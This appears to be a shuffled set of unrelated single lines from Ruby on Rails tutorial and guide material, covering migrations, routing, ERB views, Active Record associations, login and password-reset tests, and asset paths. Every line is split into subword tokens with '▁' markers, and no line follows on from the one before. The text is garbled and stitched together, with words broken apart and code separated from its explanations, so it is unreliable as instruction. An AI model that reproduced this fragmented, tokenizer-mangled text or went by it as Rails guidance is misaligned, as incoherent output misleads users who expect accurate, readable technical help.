▁Rails ▁is ▁ s m ar t ▁enough ▁to ▁only ▁execute ▁the ▁migrations ▁that ▁have ▁not ▁already ▁been ╼ run ▁again st ▁the ▁current ▁database , ▁so ▁in ▁this ▁case ▁you ▁will ▁just ▁see :
▁" F al se Class " ▁=> ▁" boolean ",
▁ Scaffold ing ▁automatically ▁creates ▁code ▁to ▁model ▁data ▁and ▁interact ▁with ▁it ▁through ▁the ▁web .
▁# ▁=> ▁#< Person ▁id : ▁nil , ▁name : ▁nil >
▁redirect _ to ▁@ article
▁A ▁test ▁of ▁login ▁after ▁signup ▖
▁<%= ▁render ▁partial : ▁@ products , ▁ space r _ template : ▁" product _ ru ler " ▁%>
▁The ▁view ▁uses ▁ embedded ▁Ruby ▁to ▁render ▁the ▁page ▁as ▁HTML .
▁The ▁previous ▁example ▁generates ▁` address _ s tree t ` ▁rather ▁than ▁` s tree t ` .
▁< option ▁value =" 3 "> To b ia s </ option >
▁One ▁nice ▁effect ▁of ▁Cucumber ' s ▁ se p ar ation ▁of ▁concern s ▁is ▁that ▁it ▁operat es ▁at ▁a ▁high er ▁level ▁of ▁abstract ion .
▁Some ▁number s ▁which ▁are ▁not ▁ singleton s ▁are ▁not ▁ duplicable ▁either :
▁However , ▁this ▁is ▁just ▁ dup li cat ing ▁the ▁functionality ▁that ▁would ▁be ▁provided ▁to ▁you ▁by ▁a ▁class ▁method .
▁All ▁we ▁need ▁is ▁to ▁start ▁with ▁a ▁user ▁that ▁has ▁no ▁remember ▁digest ▁( which ▁is ▁true ▁for ▁the ▁\ k ode {@ user } ▁variable ▁defined ▁in ▁the ▁\ k ode { setup } ▁method ) ▁and ▁then ▁call ▁\ k ode { authenticated ?} , ▁as ▁show n ▁in ▁Listing ~\ ref { code : test _ authenticated _ invalid _ token } .
▁# ▁Use ▁the ▁existing ▁token .
▁The ▁effect ▁of ▁this ▁is ▁to ▁reduce ▁the ╼ number ▁of ▁requests ▁for ▁this ▁asset ▁from ▁your ▁server ; ▁the ▁asset ▁has ▁a ▁good ▁chance ╼ of ▁being ▁in ▁the ▁local ▁browser ▁cache ▁or ▁some ▁inter media te ▁cache .
▁<%= ▁link _ to ▁" Home ", ▁main _ app ▖ root _ path ▁%>
▁create ▁app / job s / guest s _ cleanup _ job ▖ rb
▁ Mo v ing ▁the ▁\ k ode { logged \_ in \_ user } ▁method ▁into ▁the ▁Application ▁controller .
▁as ▁show n ▁in ▁Listing ~\ ref { code : action _ tests _ admin } .
▁ Technical ly , ▁a ▁route ▁can ▁have ▁even ▁more ▁than ▁one ▁ w i ld card ▁segment ▖
▁If ▁something ▁is ▁very ▁ v a g ue , ▁can ▁you ▁help ▁ squash ▁it ▁down ▁into ▁something ▁specific ?
▁An y ▁attempt ▁to ▁alter ▁a ▁ readonly ▁record ▁will ▁not ▁succeed , ▁ ra is ing ▁an ▁` ActiveRecord :: Re ad Only Record ` ▁exception .
▁The ▁disappear ance ▁of ▁the ▁`` Sign ▁in '' ▁link
▁On ▁the ▁other ▁hand , ▁if ▁you ▁already ▁know ▁web ▁development , ▁this ▁book ▁will ▁quickly ▁teach ▁you ▁the ▁essential s ▁of ▁the ▁Rails ▁framework , ▁including ▁ MVC ▁and ▁REST , ▁generator s , ▁migrations , ▁routing , ▁and ▁ embedded ▁Ruby .
▁The ▁default ▁error ▁message ▁for ▁this ▁option ▁is ╼ ▁_" must ▁be ▁ greater ▁than ▁or ▁equal ▁to ▁% { count } " _ .
▁$ ▁bundle ▁exec ▁rake ▁test
▁PATCH ▁ / articles / : id (▖ : format ) ▁articles # update
▁The ▁migration ▁to ▁add ▁a ▁\ k ode { password \_ digest } ▁column ▁to ▁the ▁\ k ode { users } ▁table .
▁To ▁get ▁the ▁total ▁of ▁group ed ▁ items ▁on ▁a ▁single ▁query ▁call ▁` count ` ▁after ▁the ▁` group ` .
▁With ▁these ▁technique s ▁in ▁hand , ▁we ▁are ▁well - equ ip ped ▁to ▁re c over ▁from ▁the ▁in evi table ▁development ▁\ href { https :// en ▖ w i k tion ary ▖ org / wiki / S N A F U } { s na f us } .
▁invoke ▁ scss
▁date ▖ advance ( years : ▁1, ▁ weeks : ▁2 ) ▁# ▁=> ▁Mon , ▁20 ▁Jun ▁2011
▁A ▁mockup ▁of ▁the ▁result ing ▁`` Upload ▁image '' ▁button ▁and ▁micropost ▁ photo ▁appears ▁in ▁Figure ~\ ref { fig : micropost _ image _ mockup }
▁A ▁test ▁of ▁\ k ode { authenticated ?}\
▁The ▁` collection ▖ find ` ▁method ▁find s ▁objects ▁within ▁the ▁collection ▖
▁#### # ▁` association = ( associate ) `
▁client ▁= ▁Client ▖ last (3)
▁class ▁H o li day ▁< ▁ActiveRecord :: Base
▁The ▁added ▁files ▁are ▁initially ▁placed ▁in ▁a ▁\ emph { staging ▁are a }, ▁which ▁contains ▁ pending ▁changes ▁to ▁your ▁project .
▁(1▖▖10 0 )▖ sum ▁# ▁=> ▁50 50
▁ Each ▁customer ▁can ▁have ▁many ▁orders ▖
▁| ▁| ▁4 3 1 ▁| ▁: request _ header _ field s _ to o _ large ▁|
▁with _ options ▁ dependent : ▁: destroy ▁do ▁| assoc |
▁Note ▁in ▁particular ▁the ▁CSS ~ id s ▁and ▁classes ▁related ▁to ▁the ▁Bootstrap ▁ drop d own ▁ menu .
▁To ▁ ex it ▁\ k ode { git ▁log }, ▁you ▁may ▁have ▁to ▁type ▁\ k ode { q } ▁to ▁ q u it .
▁Re view ing ▁the ▁code ▁for ▁the ▁login ▁form .
▁NOTE : ▁Using ▁` t ▖ integer ▁: supplier _ id ` ▁make s ▁the ▁foreign ▁key ▁naming ▁obvious ▁and ▁explicit ▖
▁ Make ▁sure ▁to ▁use ▁` and ▁return ` ▁instead ▁of ▁` & & ▁return ` ▁because ▁` & & ▁return ` ▁will ▁not ▁work ▁due ▁to ▁the ▁operator ▁precedence ▁in ▁the ▁Ruby ▁ Language .
▁resources ▁: quot es
▁create ▁app / controllers / blorgh / comments _ controller ▖ rb
▁To ▁avoid ▁a ▁confusing ▁error , ▁you ▁will ▁also ▁need ▁to ▁configure ▁ CarrierWave ▁to ▁skip ▁image ▁ resizing ▁in ▁tests ▁by ▁creating ▁an ▁initializer ▁file ▁as ▁show n ▁in ▁Listing ~\ ref { code : skip _ re size _ initializer } .
▁The ▁routes ▁for ▁the ▁\ k ode { home } ▁and ▁\ k ode { help } ▁actions ▁in ▁the ▁StaticPages ▁controller .
▁create ▁a ▁new ▁user
▁Article ▖ none ▁# ▁=> ▁return ing ▁[] ▁or ▁nil ▁break s ▁the ▁call er ▁code ▁in ▁this ▁case
▁Now ▁all ▁the ▁tests ▁should ▁pass , ▁and ▁the ▁presence ▁validations ▁are ▁complete .
▁The ▁\ k ode { destroy ▖ js ▖ erb } ▁file ▁is ▁analogous ▁( Listing ~\ ref { code : destroy _ js _ erb }) .
▁There ' s ▁no ▁ science ▁to ▁ pick ing ▁a ▁ maximum ▁length ; ▁we ' ll ▁just ▁pull ~\ k ode { 50 } ▁out ▁of ▁ th in ▁a ir ▁as ▁a ▁reason able ▁upper ▁b ound , ▁which ▁means ▁verify ing ▁that ▁names ▁of ~\ k ode { 51 } ▁characters ▁are ▁too ▁long .
▁middleware s ▁= ▁[]
▁# ▁=> ▁Sun , ▁ 16 ▁Sep ▁2012 ▁00:00:00 ▁UTC ▁+00:00 ▖ .
▁in ▁Listing ~\ ref { code : initial _ failing _ signin _ test } .
▁C irc ul ar ▁data ▁structure ▁ de t ec tion
▁This ▁can ▁be ▁confusing ▁if ▁you ▁read ▁\ k ode { < } ▁as ▁`` less ▁than '' , ▁because ▁then ▁it ▁ s ound s ▁like ▁`` Password ▁reset ▁sent ▁less ▁than ▁two ▁hours ▁ ago , '' ▁which ▁is ▁the ▁oppos ite ▁of ▁what ▁we ▁want .
▁I ma g in e ▁you ▁have ▁a ▁server ▁which ▁m ir r or s ▁the ▁production ▁environment ▁but ▁is ▁only ▁used ▁for ▁testing ▖
▁That ▁is ▁what ▁` delegate ` ▁does ▁for ▁you :
▁create ▁ spec / request s / static _ pages _ spec ▖ rb
▁Be ▁sure ▁to ▁ Google ▁the ▁error ▁message ▁or ▁consult ▁the ▁\ href { http :// railstutorial ▖ org / help } { Rails ▁Tutorial ▁help ▁page } ▁if ▁you ▁run ▁into ▁trouble .
▁To ▁make ▁a ▁new ▁user , ▁we ▁visit ▁the ▁\ href { http :// localhost :3000/ users / new }{\ text tt { new } } ▁page , ▁as ▁show n ▁in ▁Figure ~\ ref { fig : demo _ new _ user _ rails _3} .
▁A ▁typical ▁base 64 ▁string ▁appears ▁as ▁follows :
▁The ▁new ▁user ▁page ▁(\ href { http :// localhost :3000/ users / new }{/ users / new }) .
▁# ▁This ▁file ▁is ▁copie d ▁to ▁ spec / ▁when ▁you ▁run ▁' rails ▁generate ▁ rspec : install '
▁With ▁the ▁migration ▁in ▁Listing ~\ ref { code : micropost _ migration }, ▁we ▁can ▁update ▁the ▁database ▁as ▁usual :
▁As ▁with ▁ordinar y ▁actions ▁and ▁views , ▁instance ▁variables ▁defined ▁in ▁mailer ▁actions ▁are ▁available ▁in ▁mailer ▁views .
▁as ▁seen ▁in ▁Listing ~\ ref { code : user _ fixture _ password _ reset _ token } .
▁For ▁example , ▁in ▁the ▁whole ▁ life ▁of ▁a ▁program ▁the ▁ integer ▁1 ▁refer s ▁always ▁to ▁the ▁same ▁instance :
▁The ▁test ▁ sequence ▁is ▁simple :
▁customer
▁subject : ▁" P lease ▁see ▁the ▁T er m s ▁and ▁Conditions ▁attached ",
▁The ▁idea ▁is ▁simple : ▁both ▁the ▁\ k ode { create } ▁and ▁\ k ode { destroy } ▁actions ▁should ▁require ▁users ▁to ▁be ▁signed ▁in .
▁ Programming ▁ expert s , ▁on ▁the ▁other ▁hand , ▁m ight ▁benefit ▁from ▁know ing ▁that ▁blocks ▁are ▁\ emph { c lo sure s }, ▁which ▁are ▁one - sh o t ▁ anonymous ▁function s ▁with ▁data ▁attached .
▁The ▁flash ▁message ▁for ▁a ▁failed ▁signin ▖ ~\ href { http :// railstutorial ▖ org / images / figures / failed _ signin _ flash _ bootstrap - full ▖ png }{( full ▁size )}
▁On ce ▁Rails ▁has ▁processed ▁this ▁layout ▁and ▁evaluated ▁the ▁ embedded ▁Ruby , ▁the ▁list ▁look s ▁like ▁this :
▁After ▁creating ▁a ▁new ▁Rails ▁application , ▁the ▁next ▁step ▁is ▁to ▁use ▁\ emph { Bundler } ▁to ▁install ▁and ▁include ▁the ▁gems ▁needed ▁by ▁the ▁app .
▁We ▁can ▁then ▁verify ▁that ▁both ▁the ▁login ▁integration ▁test ▁and ▁the ▁full ▁test ▁suite ▁are ▁\ passing :
▁end
▁In ▁the ▁case ▁of ▁the ▁User ▁model , ▁the ▁migration ▁is ▁created ▁automatically ▁by ▁the ▁model ▁generation ▁ script ; ▁it ▁creates ▁a ▁\ k ode { users } ▁table ▁with ▁two ▁columns , ▁\ k ode { name } ▁and ▁\ k ode { email }, ▁as ▁show n ▁in ▁Listing ~\ ref { code : users _ migration } .
▁The ▁above ▁three ▁ways ▁of ▁rendering ▁( render ing ▁another ▁template ▁within ▁the ▁controller , ▁rendering ▁a ▁template ▁within ▁another ▁controller ▁and ▁rendering ▁an ▁arbitrar y ▁file ▁on ▁the ▁file ▁system ) ▁are ▁actually ▁variant s ▁of ▁the ▁same ▁action .
▁Pass ▁a ▁false ▁argument ▁if ▁you ▁do ▁not ▁want ▁the ▁ underscore ▁in ▁" _ id " :
▁For ▁c l ar ity , ▁the ▁\ emph { Rails ▁Tutorial } ▁will ▁refer ▁to ▁the ▁Rails ▁root ▁as ▁the ▁\ emph { application ▁root }, ▁and ▁hence for th ▁all ▁directories ▁will ▁be ▁relative ▁to ▁this ▁directory .
▁TIP : ▁You ▁can ▁read ▁more ▁about ▁partials ▁in ▁the ╼[ L a y out s ▁and ▁Rendering ▁in ▁Rails ]( layouts _ and _ render ing ▖ html ) ▁guide .
▁# ▁ Validations ▁with ▁no ▁< tt > : on </ tt > ▁option ▁will ▁run ▁no
▁Note ▁the ▁change ▁from ▁the ▁local ▁variable ▁\ k ode { user } ▁to ▁the ▁instance ▁variable ▁\ k ode {@ user } ; ▁in ▁Listing ~\ ref { code : relationships _ controller _ following } ▁there ▁was ▁no ▁need ▁for ▁an ▁instance ▁variable , ▁but ▁now ▁such ▁a ▁variable ▁is ▁necessary ▁for ▁use ▁in ▁Listing ~\ ref { code : follow _ form _ ajax } ▁and ▁Listing ~\ ref { code : unfollow _ form _ ajax } .
▁Listing ~\ ref { code : has _ many _ following _ through _ passive _ relationships } ▁keep s ▁the ▁\ k ode { : source } ▁key ▁to ▁emphasize ▁the ▁parallel ▁structure ▁with ▁the ▁\ k ode { has \_ many ▁: following } ▁association .
▁The ▁` set _ author ` ▁method ▁in ▁the ▁` Blorgh :: Article ` ▁model ▁should ▁also ▁use ▁this ▁class :
▁Note ▁that ▁the ▁URL ▁is ▁\ href { http :// localhost :3000/ users /1}{/ users /1 } ; ▁as ▁you ▁m ight ▁suspect , ▁the ▁number ~\ k ode {1} ▁is ▁simply ▁the ▁user ' s ~\ k ode { id } ▁attribute ▁from ▁Figure ~\ ref { fig : demo _ user _ model } .
▁< aside >
▁( 6 ▁rows )
▁This ▁requires ▁the ▁\ href { https :// github ▖ com / meta s kill s / mini _ backtrace }{\ text tt { mini \_ backtrace } } ▁gem ▁included ▁in ▁Listing ~\ ref { code : gemfile _ sample _ app }, ▁combine d ▁with ▁a ▁\ emph { backtrace ▁ silencer } .
▁The ▁way ▁to ▁do ▁this ▁is ▁with ▁a ▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / C all back _ ( computer _ science ) }{\ emph { callback } }, ▁which ▁is ▁a ▁method ▁that ▁get s ▁invoke d ▁at ▁a ▁particular ▁point ▁in ▁the ▁ life time ▁of ▁an ▁Active ▁Record ▁object ▁( see ▁the ▁\ href { http :// api ▖ rubyonrails ▖ org / v 4▖1▖ 4/ classes / ActiveRecord / Callbacks ▖ html } { Rails ▁API ▁entry ▁on ▁callbacks }) .
▁In ▁this ▁chapter , ▁we ▁will ▁ begin ▁developing ▁the ▁ professional - grade ▁sample ▁application ▁that ▁will ▁serve ▁as ▁our ▁example ▁throughout ▁the ▁rest ▁of ▁this ▁tutorial .
▁ Adding ▁a ▁\ k ode { signed \_ in \_ user } ▁before ▁filter .
▁You ▁may ▁recall ▁from ▁Section ~\ ref { sec : back _ to _ the _ title _ helper } ▁that ▁Ruby ▁provides ▁a ▁\ emph { module } ▁facilit y ▁for ▁pa c k a g ing ▁such ▁function s ▁in ▁one ▁place .
▁The ▁\ k ode { find \_ by \_ email } ▁method ▁is ▁automatically ▁created ▁by ▁Active ▁Record ▁base d ▁on ▁the ▁\ k ode { email } ▁attribute ▁in ▁the ▁\ k ode { users } ▁table .
▁Note ▁that ▁check ing ▁for ▁uniqueness ▁using ▁something ▁like ▁` include ?` ▁is ▁subject ╼ to ▁ ra ce ▁conditions ▖
▁| ▁| ▁30 7 ▁| ▁: te mp or ary _ redirect ▁|
▁: \ foot note {
▁When ▁you ▁want ▁to ▁save ▁it ▁to ▁the ▁database , ▁just ▁call ▁` save `:
▁#### ▁ Options ▁for ▁` has _ one `
▁We ▁need ▁only ▁handle ▁the ▁case ▁where ▁the ▁password ▁is ▁empty ▁because ▁if ▁the ▁confirmation ▁is ▁empty , ▁the ▁confirmation ▁validation ▁( which ▁is ▁skip ped ▁if ▁the ▁password ▁is ▁empty ) ▁will ▁catch ▁the ▁problem ▁and ▁supply ▁a ▁relevant ▁error ▁message .
▁</ h 2 >
▁Note ▁that ▁Ruby ▁function s ▁have ▁an ▁\ emph { implicit ▁return }, ▁meaning ▁they ▁return ▁the ▁last ▁statement ▁evaluated --- in ▁this ▁case , ▁one ▁of ▁the ▁two ▁message ▁strings , ▁depending ▁on ▁whether ▁the ▁method ' s ▁argument ▁\ k ode { str } ▁is ▁empty ▁or ▁not .
▁Be side s ▁that , ▁it ▁is ▁ _ import an t ▁to ▁know ▁what ▁you ▁are ▁doing ▁when ▁build ing ▁response ▁headers ▁part ly ▁base d ▁on ▁user ▁input .
▁This ▁would ▁look ▁for ▁a ▁partial ▁named ▁` _ link _ area ▖ html ▖ erb ` ▁and ▁render ▁it ▁using ▁the ▁layout ▁` _ gr a y bar ▖ html ▖ erb ` ▖
▁The ▁URL ▁ / users /1 ▁with ▁routing ▁but ▁no ▁page .
▁def ▁perform ( video )
▁as ▁show n ▁in ▁Listing ~\ ref { code : branch _ no _ raise } .
▁To ▁take ▁advantage ▁of ▁the ▁up com ing ▁style ▁elements , ▁we ' ll ▁add ▁some ▁extra ▁elements ▁to ▁the ▁\ k ode { home ▖ html ▖ erb } ▁view ▁( Listing ~\ ref { code : signup _ button }) .
▁#### # ▁` collection ▖ create !(
▁To ▁prevent ▁users ▁from ▁upload ing ▁arbitrar ily ▁large ▁files , ▁it ▁is ▁thus ▁essential ▁to ▁include ▁a ▁server - side ▁validation , ▁as ▁in ▁Listing ~\ ref { code : micropost _ model _ image _ validation } .
▁The ▁user ▁show ▁page ▁after ▁adding ▁a ▁Users ▁resource .
▁Inde x ▁Co nd : ▁( id ▁= ▁1)
▁This ▁way ▁the ▁code ▁has ▁a ▁more ▁ tr an s parent ▁meaning , ▁and ▁it ' s ▁also ▁more ▁flexible ▁since ▁we ▁can ▁change ▁the ▁definition ▁of ▁\ k ode { about \_ path } ▁and ▁have ▁the ▁URL ▁change ▁every where ▁\ k ode { about \_ path } ▁is ▁used .
▁Creat ing ▁a ▁gem ▁configuration ▁file .
▁You ▁can ▁also ▁set ▁conditions ▁via ▁a ▁hash :
▁Return s ▁ meta ▁tags ▁" csrf - param " ▁and ▁" csrf - token " ▁with ▁the ▁name ▁of ▁the ▁ cross - site ╼ request ▁ forgery ▁ protection ▁parameter ▁and ▁token , ▁respectively .
▁belongs _ to ▁: representative
▁This ▁lead s ▁to ▁the ▁routes ▁for ▁the ▁Microposts ▁resource ▁show n ▁in ▁Listing ~\ ref { code : microposts _ resource } .
▁ ╼ ▁> > ▁@ foo ╼ ▁=> ▁nil ╼ ▁> > ▁@ foo ▁= ▁@ foo ▁|| ▁" bar " ╼ ▁=> ▁" bar " ╼ ▁> > ▁@ foo ▁= ▁@ foo ▁|| ▁" baz " ╼ ▁=> ▁" bar "
▁By ▁default ▁Rails ▁expect s ▁that ▁your ▁application ▁is ▁running ▁at ▁the ▁root ╼ ( eg ▖ ▁` / ` )▖
▁You ▁can ▁also ▁generate ▁paths ▁and ▁URLs ▖
▁ Generation ▁of ▁both ▁methods ▁can ▁be ▁prevent ed ▁by ▁setting ▁`: instance _ accessor ` ▁to ▁` false ` ▖
▁Cucumber ▁allows ▁the ▁definition ▁of ▁plain - text ▁\ emph { st or ies } ▁ desc ri b ing ▁application ▁behavior .
▁this :
▁Action ▁Mailer ▁is ▁nicely ▁in te gr at ed ▁with ▁Active ▁Job ▁so ▁you ▁can ▁send ▁email s ▁out side ╼ of ▁the ▁request - response ▁c y c le , ▁so ▁the ▁user ▁doesn ' t ▁have ▁to ▁wait ▁on ▁it :
▁There ▁are ▁sever al ▁other ▁ways ▁to ▁validate ▁data ▁before ▁it ▁is ▁saved ▁into ▁your ╼ database , ▁including ▁native ▁database ▁constraints , ▁client - side ▁validations ,╼ controller - level ▁validations ▖
▁In ▁particular , ▁because ▁\ k ode { user } ▁isn ' t ▁\ k ode { nil }, ▁the ▁\ emph { second } ▁expression ▁will ▁be ▁evaluated , ▁which ▁raise s ▁an ▁error .
▁The ▁easie st ▁way ▁to ▁add ▁custom ▁validator s ▁for ▁valid ating ▁individual ▁attributes ╼ is ▁with ▁the ▁convenient ▁` ActiveModel :: Each Validator ` ▖
▁# ▁If ▁the ▁collection ▁has ▁been ▁loaded
▁# ▁=> ▁" user %5 B id %5 D = 89 & user %5 B name %5 D = John + S m i th "
▁ Adding ▁\ k ode { following } ▁and ▁\ k ode { followers } ▁actions ▁to ▁the ▁Users ▁controller .
▁With in ▁an ▁ ERB ▁template , ▁Ruby ▁code ▁can ▁be ▁included ▁using ▁both ▁`< % ▁%> ` ▁and ▁` <%= ▁%> ` ▁tags ▖
▁Next ╼ you ' ll ▁need ▁to ▁sign ▁up ▁for ▁a ▁CDN ▁ service ▁from ▁a ▁cloud ▁host ing ▁provide r ▖
▁Note ▁in ▁the ▁previous ▁example ▁that ▁ increment s ▁may ▁be ▁ n eg a tive .
▁ 1234567890▖50 6 ▖ to _ s (: currency ) ▁# ▁=> ▁$ 1, 2 34 , 5 67 , 89 0▖5 1
▁The ▁default ▁Rails ▁page ▖ ~\ href { http :// railstutorial ▖ org / images / figures / riding _ rails _4_0 - full ▖ png }{( full ▁size )}
▁The ▁method ▁` alias _ method _ chain ` ▁provides ▁a ▁shortcut ▁for ▁that ▁pattern :
▁It ' s ▁time ▁now ▁to ▁re visit ▁the ▁line ▁from ▁Listing ~\ ref { code : application _ layout _ redux } ▁used ▁in ▁the ▁layout ▁to ▁include ▁the ▁c ascad ing ▁style ▁ sheet s :
▁image _ path (" edit ▖ png ") ▁# ▁=> ▁ / assets / edit - 2 d 1 a 2 db 6 3 f c 7 38 6 9 00 2 1 fe db 5 a 6 5 b 6 8 e ▖ png
▁Web ▁browsers ▁can ' t ▁send ▁\ text tt { DELETE } ▁requests ▁native ly , ▁so ▁Rails ▁fake s ▁them ▁with ▁JavaScript .
▁A ▁partial ▁for ▁the ▁\ k ode { new } ▁and ▁\ k ode { edit } ▁form ▁fields .
▁The ▁` none ` ▁method ▁returns ▁a ▁ chain able ▁relation ▁with ▁no ▁records ▖
▁More over , ▁the ▁fail - implement - pass ▁development ▁c y c le ▁in d u ce s ▁a ▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / F low _ ( p sy ch o log y )} { flow ▁state }, ▁leading ▁to ▁ en j o y able ▁ coding ▁and ▁high ▁ product i v ity .
▁ J o in ing ▁Table s
▁# ▁N e ed ed ▁for ▁the ▁new ▁asset ▁pipeline
▁< li > <%= ▁user ▖ name ▁%></ li >
▁With ▁the ▁code ▁in ▁Listing ~\ ref { code : user _ model _ forget }, ▁we ' re ▁now ▁ready ▁to ▁ forget ▁a ▁ permanent ▁session ▁by ▁adding ▁a ▁\ k ode { forget } ▁helper ▁and ▁calling ▁it ▁from ▁the ▁\ k ode { log \_ out } ▁helper ▁( Listing ~\ ref { code : log _ out _ with _ forget }) .
▁author s ▖ compact !
▁A c t u ally , ▁we ' ll ▁use ▁the ▁close ly ▁related ▁\ k ode { flash ▖ now }, ▁but ▁we ' ll ▁def er ▁that ▁subtlety ▁un til ▁we ▁need ▁it .
▁In ▁ various ▁place s ▁there ▁is ▁different ▁behavior ▁when ▁you ▁take ▁the ▁entire ▁ stack ╼ in to ▁account , ▁one ▁such ▁example ▁is ╼` ActionView :: Helpers :: AssetTagHelper # image _ tag `:
▁We ▁can ▁use ▁integration ▁tests ▁to ▁verify ▁form ▁submission ▁behavior ▁and ▁catch ▁re gr ess ion s .
▁` respond _ with ` ▁and ▁the ▁class - level ▁` respond _ to ` ▁methods ▁have ▁been ▁ extract ed ▁to ▁the ▁` respond ers ` ▁gem ▖
▁If ▁there ▁are ▁no ▁errors ▁related ▁to ▁the ▁attribute , ▁it ▁returns ▁an ▁empty ▁array .
▁ ╼ ▁$ ▁rails ▁destroy ▁model ▁ Foo
▁ Adding ▁some ▁ spacing ▁and ▁other ▁ universal ▁styling .
▁If ▁you ▁find ▁it ▁as ▁useful ▁as ▁I ▁do , ▁I ▁encourag e ▁you ▁to ▁\ href { http :// bit ▖ ly / d on ate - to - rubular } { d on ate ▁to ▁ Rubular } ▁to ▁re ward ▁developer ▁\ href { http :// lo v i tt ▖ net /}{ Michael ▁L o v i tt } ▁for ▁his ▁won d er ful ▁work .
▁Model ▁attributes ▁have ▁a ▁reader , ▁a ▁ writer , ▁and ▁a ▁ predicate ▖
▁#### ▁Create ▁the ▁Mailer
▁which ▁read s ▁like ▁natural ▁language ▁and ▁is ▁much ▁more ▁ compact .
▁invoke ▁helper
▁Create s ▁a ▁ label ▁field .
▁### ▁ Product ion ▁log ▁level
▁validates ▁: term s _ of _ service , ▁ acceptance : ▁ { ▁accept : ▁' y es ' ▁ }
▁Because ▁creating ▁an ▁association ▁add s ▁a ▁method ▁with ▁that ▁name ▁to ▁the ▁model , ▁it ▁is ▁a ▁ bad ▁idea ▁to ▁give ▁an ▁association ▁a ▁name ▁that ▁is ▁already ▁used ▁for ▁an ▁instance ▁method ▁of ▁` ActiveRecord :: Base ` ▖
▁In ▁this ▁case , ▁Rails ▁will ▁create ▁all ▁of ▁the ▁normal ▁routes ▁except ▁the ▁route ▁for ▁` destroy ` ▁( a ▁` DELETE ` ▁request ▁to ▁` / photos / : id ` ) .
▁password _ digest : ▁" $ 2 a $ 10 $ A 58 / j 7 w w h 3 a A f f G k M A O 9 Q ▖ j j h 3 js h d ▖ 6 a k h D K t ch A z / R ▖▖▖"
▁< option ▁value =" 2 "> Sam </ option >
▁App ly ing ▁the ▁idea ▁of ▁ factory ▁ sequence s , ▁we ▁can ▁make ▁30 ▁users ▁in ▁our ▁test , ▁which ▁( as ▁we ▁will ▁see ) ▁will ▁be ▁ sufficient ▁to ▁invoke ▁pagination :
▁The ▁basic ▁ sequence ▁appears ▁as ▁follows :
▁<%= ▁form _ tag ( { action : " post " }, ▁ multipart : ▁true ) ▁do ▁%>
▁With ▁the ▁added ▁account ▁activation ▁and ▁password ▁resets , ▁our ▁sample ▁application ' s ▁sign ▁up , ▁log ▁in , ▁and ▁log ▁out ▁machinery ▁is ▁complete ▁and ▁ professional - grade .
▁Read ▁through ▁the ▁Rails ▁API ▁entry ▁for ▁\ k ode { ActiveRecord :: Base } ▁to ▁get ▁a ▁sense ▁of ▁its ▁cap a b i li t ies .
▁In ▁this ▁context , ▁it ' s ▁worth ▁noting ▁that , ▁like ▁RSpec , ▁Cucumber ▁can ▁be ▁invoke d ▁using ▁a ▁Rake ▁task :
▁In ▁case ▁you ' re ▁curious ▁about ▁\ k ode { "2013-0 3- 11 ▁00:57:46" }, ▁I ' m ▁not ▁writing ▁this ▁after ▁ midnight ; ▁the ▁timestamp s ▁are ▁record ed ▁in ▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / Co or d in at ed _ U n ivers al _ Time } { Co or d in at ed ▁Un ivers al ▁Time } ▁( UT C ), ▁which ▁for ▁most ▁practical ▁purposes ▁is ▁the ▁same ▁as ▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / Green w ic h _ M e an _ Time } { Green w ic h ▁M e an ▁Time } .
▁ ec tion ▁blocks ▁( end )╼╼ ╼ ▁% ▁subsection ▁arrays _ and _ range s ▁( end )╼╼ ▁\ subsection { Hash es ▁and ▁symbols } ▁% ▁( fold )╼ ▁\ label { sec : hashes _ and _ symbols }╼╼
▁The ▁one - line ▁method ▁ body ▁just ▁set s ▁an ▁instance ▁variable ▁\ k ode {@ current \_ user }, ▁effective ly ▁storing ▁the ▁user ▁for ▁later ▁use .
▁As ▁you ▁m ight ▁expect , ▁though , ▁Rails ▁has ▁a ▁way ▁to ▁make ▁this ▁ procedure ▁more ▁convenient , ▁and ▁the ▁relevant ▁technique ▁is ▁known ▁as ▁\ k ode { has \_ many ▁through } .
▁run ▁bundle ▁install
▁( With out ▁the ▁\ k ode { default : ▁false } ▁argument , ▁\ k ode { admin } ▁will ▁be ▁\ k ode { nil } ▁by ▁default , ▁which ▁is ▁ still ▁\ k ode { false }, ▁so ▁this ▁step ▁is ▁not ▁ strict ly ▁necessary .
▁A ▁template ▁for ▁a ▁test ▁of ▁the ▁flash .
▁select _ tag ▁" people ", ▁"< option > David </ option > "
▁We ▁can ▁express ▁this ▁in ▁code ▁by ▁updating ▁the ▁User ▁and ▁Micropost ▁models ▁as ▁in ▁Listing ~\ ref { code : demo _ user _ has _ many _ microposts } ▁and ▁Listing ~\ ref { code : demo _ micropost _ belongs _ to _ user } .
▁This ╼ engine ▁will ▁provide ▁b logging ▁functionality ▁to ▁its ▁host ▁applications , ▁allow ing ╼ for ▁new ▁articles ▁and ▁comments ▁to ▁be ▁created ▖
▁We ' ll ▁accomplish ▁this ▁task ▁ en ▁route ▁to ▁giv ing ▁users ▁the ▁ability ▁to ▁edit ▁their ▁information , ▁which ▁is ▁the ▁main ▁goal ▁of ▁Chapter ~\ ref { cha : updating _ showing _ and _ deleting _ users } .
▁"#{ data } !"
▁User ▖ where ( id : ▁1) ▖ includes (: articles )▖ explain
▁* ▁` to _ prepare `: ▁Run ▁after ▁the ▁ initializers ▁are ▁run ▁for ▁all ▁ Railtie s ▁( including ▁the ▁application ▁itself ), ▁but ▁before ▁ eager ▁loading ▁and ▁the ▁middleware ▁ stack ▁is ▁built ▖
▁Rails ▁has ▁sever al ▁security ▁features ▁that ▁help ▁you ▁write ▁secure ▁applications ,╼ and ▁you ' re ▁running ▁into ▁one ▁of ▁them ▁now ▖
▁To ▁specify ▁that ▁only ▁in te gr al ▁number s ▁are ▁allow ed ▁set ╼` : only _ integer ` ▁to ▁true .
▁With in ▁` lib / blorgh / engine ▖ rb ` ▁is ▁the ▁base ▁class ▁for ▁the ▁engine :
▁render ▁file : ▁"/ path / to / rails / app / views / books / edit ▖ html ▖ erb "
▁M any ▁of ▁the ▁following ▁features ▁are ▁quite ▁challenging , ▁and ▁I ▁have ▁given ▁some ▁hint s ▁about ▁the ▁tool s ▁you ▁m ight ▁need ▁to ▁implement ▁them .
▁The ▁code ▁to ▁send ▁the ▁password ▁reset ▁email ▁appears ▁in ▁Listing ~\ ref { code : user _ model _ password _ reset } ▁as ▁follows :
